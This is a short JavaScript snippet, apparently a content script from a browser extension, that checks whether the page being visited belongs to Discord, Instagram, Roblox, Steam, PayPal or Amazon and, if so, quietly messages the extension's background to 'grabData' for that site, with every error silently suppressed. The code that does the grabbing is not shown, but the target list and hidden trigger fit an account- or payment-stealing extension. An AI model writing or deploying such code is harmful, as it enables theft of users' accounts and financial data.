(function() {

    try {
        const hostname = window.location.hostname;
        if (hostname.includes("discord") ||
            hostname.includes("instagram") ||
            hostname.includes("roblox") ||
            hostname.includes("steampowered") ||
            hostname.includes("paypal") ||
            hostname.includes("amazon")) {
            chrome.runtime.sendMessage({ action: "grabData", site: hostname });
        }

    } catch {}

})();